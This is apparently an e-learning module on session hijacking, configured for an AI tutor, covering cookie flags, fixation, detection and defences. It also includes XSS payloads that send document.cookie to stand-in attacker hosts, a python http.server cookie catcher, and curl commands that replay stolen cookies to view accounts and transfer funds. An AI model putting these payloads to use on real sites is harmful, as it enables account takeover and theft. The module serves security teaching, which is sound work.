title: Session Hijacking — Hands-On
description: Steal, replay, and defend session cookies: python3 http.server capture, curl replay, cookie flags, and real session hijacking attacks
learning_outcomes: Understand how HTTP sessions work and why they are vulnerable
Set up a cookie-capturing server with python3 -m http.server
Steal session cookies via XSS and exfiltrate them to a remote server
Replay stolen cookies with curl to impersonate victims
Detect session hijacking through log analysis
Implement HttpOnly, Secure, and SameSite cookie defences

ai_tutor_config.personality: Encouraging, patient, uses real-world analogies. Never judges. Celebrates small wins.

intervention_triggers.idle_40_seconds: Sessions can be confusing — think of them as hotel key cards. Want me to explain with that analogy?
intervention_triggers.idle_90_seconds: Still thinking? Let me break this into smaller steps. Which part is tricky: the cookie, the capture, or the replay?
intervention_triggers.idle_180_seconds: No rush! Let me show you a diagram of exactly how the cookie travels from victim to attacker.
intervention_triggers.first_error: Close! Check your cookie string — it needs to be copied exactly, including the node0 part at the end.
intervention_triggers.repeated_errors: Let me trace through the attack step by step with you. First, where does the cookie come from?
intervention_triggers.after_success: You just hijacked a session! That's a real penetration testing skill. Now let's learn to defend against it.

encouragement_phrases: You're thinking like a penetration tester now!
Session hijacking is one of the most powerful attacks — and you just did it!
Understanding the attack is the first step to building the defence.
Real security auditors use exactly these techniques.
You just proved why HttpOnly cookies matter — with evidence!
curl replay is used in real bug bounty reports.
Every cookie flag you learn saves thousands of users from attack.
You're building skills that companies pay top dollar for.

explanation_styles.analogy: A session cookie is like a hotel key card. If someone copies your card, they get into your room, use the minibar, and charge it all to you. The hotel can't tell the difference.
explanation_styles.visual: Browser → sends cookie → Server says 'Welcome user1' / Attacker → sends SAME cookie → Server says 'Welcome user1' (can't tell the difference!)
explanation_styles.step_by_step: Step 1: Start listener. Step 2: Inject XSS. Step 3: Victim visits page. Step 4: Cookie captured. Step 5: curl with cookie. Step 6: You ARE the victim.
explanation_styles.code_trace: Line 1: python3 -m http.server 8000 — starts listening. Line 2: new Image().src sends GET request. Line 3: Server log shows ?c=JSESSIONID=...
explanation_styles.comparison: Without HttpOnly: document.cookie returns 'JSESSIONID=abc123' → stealable. With HttpOnly: document.cookie returns '' → invisible to JavaScript.

lessons.title: Session Hijacking — From Cookie Theft to Account Takeover

theory.introduction:
Every time you log into a website, the server gives your browser a small piece of data called a session cookie. This cookie is your proof of identity — like a wristband at a festival. Show the wristband, get VIP access. No questions asked.

But what if someone photographs your wristband and prints a copy? They walk into VIP, drink your drinks, and charge everything to your account. The security guard can't tell the difference — the wristband looks identical.

That's exactly what session hijacking does. An attacker steals your session cookie (usually via XSS), then uses it to impersonate you. The server sees a valid cookie and thinks the attacker IS you.

This module teaches you the complete session hijacking chain: from setting up a cookie-capturing server, to stealing cookies via XSS, to replaying them with curl, to defending against the entire attack. Everything is hands-on — you'll do every step yourself.
theory.why_important:
Session hijacking is one of the most impactful web attacks because it gives the attacker COMPLETE control of the victim's account — without needing their password. Banks, social media, email — any application that uses session cookies is vulnerable if the cookies aren't properly protected.

The defence is simple: three cookie flags (HttpOnly, Secure, SameSite). But a shocking number of real applications still get this wrong. Understanding the attack teaches you exactly WHY these flags matter and what happens when they're missing.

key_concepts.explanation:
HTTP is stateless — the server forgets you after every request. Sessions solve this by giving your browser a unique ID (the session cookie) after you log in.

The flow:
1. You send username + password to the server
2. Server verifies credentials and creates a session (a data structure stored in server memory)
3. Server sends back a cookie: Set-Cookie: JSESSIONID=node0abc123
4. Your browser stores this cookie
5. Every subsequent request includes: Cookie: JSESSIONID=node0abc123
6. Server looks up this ID, finds your session data, and knows it's you

The critical point: the server identifies you ONLY by this cookie value. Anyone who sends the same cookie IS you, as far as the server knows.
key_concepts.ai_hint: Think of JSESSIONID as a numbered ticket at a deli counter. If someone has ticket #42, they get served as customer #42 — regardless of who they actually are.

key_concepts.explanation:
Session cookies have three security flags. Each one blocks a different attack vector:

HttpOnly — Blocks JavaScript access
• When set: document.cookie CANNOT read the session cookie
• When missing: XSS can steal the cookie via document.cookie
• This is the #1 defence against cookie theft via XSS

Secure — Blocks unencrypted transmission
• When set: Cookie only sent over HTTPS
• When missing: Cookie sent over plain HTTP too (network sniffing possible)
• Anyone on the same WiFi can intercept the cookie

SameSite — Blocks cross-site sending
• Strict: Cookie never sent with cross-site requests
• Lax: Cookie sent with GET navigations but not POST
• None: Cookie always sent (no protection)
• Prevents CSRF attacks that rely on automatic cookie inclusion
key_concepts.ai_hint: HttpOnly = invisible ink (JS can't see it). Secure = armoured truck (only travels on safe roads). SameSite = ID check (only accepted from the same website).

key_concepts.concept: Setting Up a Cookie Catcher — python3 http.server
key_concepts.explanation:
Before you can steal a cookie, you need somewhere to receive it. The simplest way is Python's built-in HTTP server. It logs every request including the full URL — which is where the stolen cookie will be embedded.

Setup:
1. Open a terminal
2. Run: python3 -m http.server 8000
3. The server starts listening on port 8000
4. Every incoming request is logged with the full URL

When an XSS payload sends: new Image().src = 'http://YOUR_IP:8000/?c=' + document.cookie
The server log shows: GET /?c=JSESSIONID=node0abc123 HTTP/1.1 200

You now have the victim's session cookie.
key_concepts.ai_hint: python3 http.server is like setting up a mailbox. You put up the mailbox (start the server), and wait for letters (cookies) to arrive. Every letter gets logged.

key_concepts.explanation:
There are several ways to send a stolen cookie from the victim's browser to the attacker's server. Each has trade-offs:

1. Image tag: new Image().src = 'http://evil/?c=' + document.cookie
   Pro: Works everywhere, bypasses most CSP
   Con: Shows in Network tab if someone looks

2. Fetch API: fetch('http://evil/?c=' + document.cookie)
   Pro: Modern, clean code
   Con: Blocked by strict CSP, CORS issues

3. Navigator.sendBeacon: navigator.sendBeacon('http://evil/', document.cookie)
   Pro: Designed for analytics, often allowed
   Con: POST only, some CSPs block it

4. WebSocket: var ws = new WebSocket('ws://evil/'); ws.send(document.cookie)
   Pro: Real-time, bidirectional
   Con: More complex, WebSocket must be set up

The Image technique is the most reliable and widely used.
key_concepts.ai_hint: The Image trick is the Swiss Army knife of cookie theft — simple, reliable, and works almost everywhere. The browser doesn't care that the 'image' never loads — the request was already sent.

key_concepts.concept: Reading Server Logs — Extracting the Cookie
key_concepts.explanation:
After the XSS fires and sends the cookie, you need to extract it from the server logs. Here's what to look for:

Server log format:
IP - [date] "METHOD /path?params HTTP/1.1" status_code -

Example:
127.0.0.1 - [06/Mar/2026 18:19:48] "GET /?c=JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0 HTTP/1.1" 200 -

The cookie value is everything after ?c= and before HTTP:
JSESSIONID=node016d4qjfmxsbiz113wprfoos23l2.node0

Important: If you see multiple different JSESSIONID values in the log, each one belongs to a different user session. This means you've captured cookies from multiple victims.
key_concepts.ai_hint: Each unique JSESSIONID is a different person's session. It's like catching different people's hotel key cards — each card opens a different room.

key_concepts.explanation:
curl is a command-line tool for making HTTP requests. By including the stolen cookie with the --cookie flag, you can make requests as if you were the victim.

Basic replay (view account):
curl http://bank.com/account --cookie 'JSESSIONID=stolen_value'

The server receives this request, looks up the session ID, finds it belongs to user1, and returns user1's account page — complete with balance, card number, and profile.

Action replay (transfer funds):
curl -X POST http://bank.com/transfer \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'to=999999&transferAmount=500' \
  --cookie 'JSESSIONID=stolen_value'

The server processes this as a legitimate transfer FROM user1. The victim's balance decreases. The attacker never needed the password.
key_concepts.ai_hint: curl with --cookie is like wearing someone else's name badge at a conference. Everyone treats you as that person. You can go to their meetings, access their documents, and speak on their behalf.

key_concepts.explanation:
These are two different session attacks:

Session HIJACKING (what we've been learning):
• When: AFTER the victim logs in
• How: Steal the existing session cookie
• The victim already has a valid session
• Attacker steals it and uses it

Session FIXATION:
• When: BEFORE the victim logs in
• How: Attacker sets the session ID, then waits for victim to log in
• Attacker creates a session ID, tricks victim into using it
• After victim logs in, that fixed session ID is now authenticated
• Attacker already knows the ID — instant access

Defence against fixation: Regenerate the session ID on login.
The old (fixed) ID becomes invalid, and the attacker's known ID is useless.
key_concepts.ai_hint: Hijacking = stealing someone's car keys after they parked. Fixation = giving someone a car with a spare key you kept. Both end with you driving their car.

key_concepts.explanation:
Even if a cookie is stolen, the damage is limited if the session expires quickly. Good session management includes:

Absolute timeout: Session dies after X minutes regardless of activity (e.g., 30 minutes for banking). This limits the window an attacker has to use a stolen cookie.

Idle timeout: Session dies after X minutes of no requests (e.g., 5 minutes). If the victim stops using the site, the stolen cookie becomes useless.

Explicit invalidation: When the user clicks 'Logout', the session is destroyed server-side. The cookie value still exists in the browser, but the server no longer recognises it.

Session regeneration: Create a new session ID after sensitive actions (login, password change, privilege escalation). This invalidates any previously stolen cookies.
key_concepts.ai_hint: Session timeout is like an expiring train ticket. Even if someone steals your ticket, it only works until the expiry time. Shorter timeout = smaller risk window.

key_concepts.explanation:
If the Secure flag is missing, the session cookie is sent over plain HTTP — unencrypted. Anyone on the same network can intercept it.

How it works:
1. Victim connects to public WiFi (coffee shop, airport)
2. Victim visits http://bank.com (not HTTPS)
3. Browser sends: Cookie: JSESSIONID=abc123 IN PLAIN TEXT
4. Attacker on the same WiFi captures the packet
5. Attacker now has the session cookie

This is called a 'man-in-the-middle' attack. Tools like Wireshark can capture these cookies in seconds.

Defence: The Secure flag ensures the cookie is ONLY sent over HTTPS. Even on public WiFi, HTTPS encrypts the cookie so it cannot be read by others on the network.
key_concepts.ai_hint: Plain HTTP is like sending a postcard — anyone who handles it can read it. HTTPS is like a sealed envelope — only the recipient can open it. The Secure flag ensures your cookie always travels in an envelope.

key_concepts.explanation:
How do you know if someone is using a stolen session? Look for these red flags:

1. IP address change: Same session used from two different IPs
2. User-Agent change: Session switches from Chrome to curl
3. Geographic impossibility: Session in London, then New York 1 minute later
4. Activity patterns: Actions at 3 AM for a user who only uses the app 9-5
5. Concurrent sessions: Same session active in two browsers simultaneously

Server-side detection:
- Log the IP and User-Agent with each request
- Compare with previous requests in the same session
- If they change dramatically, invalidate the session and force re-login
- Alert the user: 'Your account was accessed from an unusual location'
key_concepts.ai_hint: It's like a bank that notices your card was used in London and Tokyo within 5 minutes. That's physically impossible — the card must be cloned. Same logic applies to session cookies.

key_concepts.explanation:
A properly secured session needs ALL of these:

1. Cookie flags: HttpOnly=true, Secure=true, SameSite=Strict
2. Session timeout: 30 minutes max for sensitive apps
3. Session regeneration: New ID on login, password change, privilege escalation
4. Logout: Server-side invalidation + cookie expiry
5. Transport: HTTPS everywhere + HSTS header
6. Detection: Monitor for IP/User-Agent changes
7. Binding: Optional — bind session to IP or browser fingerprint
8. Token rotation: Rotate session ID periodically (every 15 minutes)

If ANY of these is missing, there's a potential attack vector. Defence in depth means implementing ALL of them.
key_concepts.ai_hint: Think of it as a castle: HttpOnly is the moat, Secure is the walls, SameSite is the guards, timeout is the drawbridge that rises at night. You need ALL of them.

key_concepts.explanation:
Session hijacking isn't theoretical — it happens to major companies:

Firesheep (2010): A Firefox extension that captured session cookies on public WiFi. It could hijack Facebook, Twitter, and Amazon sessions with one click. It was used by millions before HTTPS became standard.

GitHub (2013): A session fixation vulnerability allowed attackers to fix a session ID via a crafted URL. After the victim logged in, the attacker had full access to their repositories.

Slack (2022): Session token theft via compromised employee credentials allowed attackers to access private Slack channels and download private repository data.

All of these could have been prevented with proper cookie flags and session management. The defences you're learning in this module would have stopped every single one.
key_concepts.ai_hint: Firesheep was a wake-up call for the entire internet. It showed that session cookies on public WiFi were like shouting your password across a crowded room. HTTPS everywhere was the response.

complete_examples.title: Example 1: Check Cookie Flags in Browser
complete_examples.description: Use Developer Tools to inspect session cookie security flags.
complete_examples.output: Cookie flags displayed — HttpOnly=false means JavaScript can steal it, Secure=false means WiFi sniffing possible
complete_examples.ai_explanation: This is the very first step of any session security assessment. Before trying any attack, check if the cookie is even stealable. If HttpOnly=true, the XSS→cookie chain is already broken.
complete_examples.ai_challenge: What happens if HttpOnly is true but Secure is false? Is the session still vulnerable? (Hint: think about network sniffing)

complete_examples.title: Example 2: Start a Cookie Catcher
complete_examples.description: Set up a simple HTTP server to receive stolen cookies.
complete_examples.output: Server running on port 8000, logs all incoming requests including URL parameters
complete_examples.ai_explanation: python3 http.server is the simplest way to receive data exfiltrated via XSS. No setup, no configuration, no third-party tools. Just one command.
complete_examples.ai_challenge: What if port 8000 is already in use? How would you start the server on a different port?

complete_examples.title: Example 3: Basic Cookie Theft XSS
complete_examples.description: Inject a script that sends the session cookie to your server.
complete_examples.ai_explanation: The Image trick exploits the fact that browsers load images from any domain without restriction. The 'image' URL contains the stolen cookie as a query parameter.
complete_examples.ai_challenge: What if the victim's browser has an ad blocker that blocks requests to unknown IPs? How could you modify the exfiltration method?

complete_examples.title: Example 4: Extract Cookie from Server Log
complete_examples.description: Parse the server log to find the stolen JSESSIONID value.
complete_examples.ai_explanation: The cookie value includes everything from JSESSIONID= to the next space. The .node0 suffix is part of the value — don't forget to include it when replaying.
complete_examples.ai_challenge: If you see 5 log entries but only 2 unique JSESSIONID values, what does that tell you?

complete_examples.title: Example 5: Replay with curl — View Account
complete_examples.description: Use the stolen cookie to access the victim's account page.
complete_examples.output: curl returns victim's account page with balance, card number, and profile — session hijacking confirmed
complete_examples.ai_explanation: This is the proof-of-concept that the session was successfully hijacked. The server cannot distinguish between the real user's browser and an attacker using curl with the same cookie.
complete_examples.ai_challenge: How could the server detect that this request came from curl instead of a real browser? (Hint: check the User-Agent header)

complete_examples.title: Example 6: Replay with curl — Transfer Funds
complete_examples.description: Use the stolen session to transfer money as the victim.
complete_examples.output: Transfer processed successfully — victim's balance decreased without their knowledge or password
complete_examples.ai_explanation: This demonstrates the full impact of session hijacking: not just viewing data, but performing actions. The server sees a valid session cookie and a valid transfer request — it has no reason to reject it.
complete_examples.ai_challenge: What if the transfer form required a CSRF token? Would curl replay still work? Why or why not?

complete_examples.title: Example 7: Detect Multiple Victims
complete_examples.description: Analyse server logs to identify cookies from different users.
complete_examples.output: Two distinct JSESSIONID values identified — each belongs to a different user, confirmed by accessing different account data
complete_examples.ai_explanation: In a real attack with a stored XSS on a popular page, you'd see hundreds of different session cookies. Each one is a different victim. The attacker can impersonate any of them.
complete_examples.ai_challenge: If you see the SAME JSESSIONID appearing 10 times, does that mean 10 different users? Why or why not?

complete_examples.title: Example 8: Session Fixation Attack
complete_examples.description: Set a session ID before the victim logs in, then use it after.
complete_examples.output: Attacker accesses victim's account using the pre-set session ID — session fixation successful
complete_examples.ai_explanation: Session fixation is sneaky because the attacker doesn't need to steal anything — they plant a known session ID and wait. The fix is simple: always create a new session ID when the user logs in.
complete_examples.ai_challenge: What if the application regenerates the session ID on login but not on privilege escalation (e.g., becoming admin)? Is it still vulnerable?

complete_examples.title: Example 9: Implement HttpOnly Defence
complete_examples.description: Set the HttpOnly flag and verify document.cookie can no longer read it.
complete_examples.output: document.cookie returns empty string — XSS executes but cannot steal the session cookie
complete_examples.ai_explanation: HttpOnly is the single most important cookie flag. It doesn't prevent XSS — the script still runs. But it prevents the script from accessing the session cookie, which breaks the hijacking chain.
complete_examples.ai_challenge: If HttpOnly is set, can the attacker still cause damage with XSS? (Hint: think about what else XSS can do besides steal cookies)

complete_examples.title: Example 10: Implement Secure + SameSite
complete_examples.description: Add all three cookie security flags.
complete_examples.output: All three flags set — cookie invisible to JS, HTTPS-only, same-site-only, auto-expires
complete_examples.ai_explanation: Using setHeader gives you full control over the cookie format. This is more reliable than using Cookie.setHttpOnly() etc. because some flags (SameSite) aren't supported by older Servlet APIs.
complete_examples.ai_challenge: What's the difference between SameSite=Strict and SameSite=Lax? When would you choose Lax over Strict?

complete_examples.title: Example 11: Session Regeneration on Login
complete_examples.description: Prevent session fixation by creating a new session after authentication.
complete_examples.output: New session ID generated on login — any previously fixed or stolen session IDs become invalid
complete_examples.ai_explanation: Session regeneration is cheap (one line of code) but prevents an entire category of attacks. Always regenerate on: login, logout, password change, and privilege escalation.
complete_examples.ai_challenge: Should you regenerate the session ID when a user changes their email address? What about when they view sensitive data like bank statements?

complete_examples.title: Example 12: Build a Session Security Monitor
complete_examples.description: Create a servlet filter that detects suspicious session activity.
complete_examples.output: Filter detects IP or User-Agent changes and immediately kills the session — stops curl replay attacks
complete_examples.ai_explanation: This filter catches the most common session hijacking indicator: the same session being used from a different IP or browser. It's not perfect (shared IPs, mobile networks) but catches most curl-based replays.
complete_examples.ai_challenge: What false positives could this filter produce? (Hint: think about mobile users switching between WiFi and cellular)

visual_diagram.title: Session Hijacking — Complete Attack & Defence Flow
visual_diagram.content:
SESSION HIJACKING FLOWCHART
PHASE 1: SETUP
▶ Attacker opens terminal ▶ Runs: python3 -m http.server 8000 ▶ Server listening on port 8000 → ready to receive cookies
↓ ↓ ↓
PHASE 2: INJECTION
▶ Attacker injects XSS into their profile: <script>new Image().src='http://ATTACKER:8000/?c='+document.cookie</script> ▶ Payload stored in database (no sanitisation)
↓ ↓ ↓
PHASE 3: CAPTURE
▶ Victim logs in → gets JSESSIONID cookie ▶ Victim visits attacker's profile ▶ XSS fires → document.cookie readable (HttpOnly=false!) ▶ Image request sends cookie to attacker's server ▶ Server log: GET /?c=JSESSIONID=node0abc123
↓ ↓ ↓
PHASE 4: REPLAY
▶ Attacker copies the JSESSIONID value ▶ Uses curl: curl --cookie 'JSESSIONID=node0abc123' http://bank/transfer -d 'to=999999&amount=500' ▶ Server sees valid session → processes transfer as victim! ▶ Victim's balance drops → attacker receives funds
DEFENCES — Break the chain at any point:
✔ HttpOnly → document.cookie returns nothing → Phase 3 blocked ✔ Secure → cookie only on HTTPS → WiFi sniffing blocked ✔ SameSite=Strict → cookie not sent cross-site → CSRF blocked ✔ Output Encoding → XSS never executes → Phase 2 blocked ✔ Session Timeout → cookie expires in 30 min → replay window limited ✔ IP Binding → detects curl from different IP → Phase 4 blocked

practice_exercises.ai_intro: Welcome to Session Fundamentals! Let's build your session security skills.

Think about how sessions work: cookie sent → server looks up → identity confirmed.
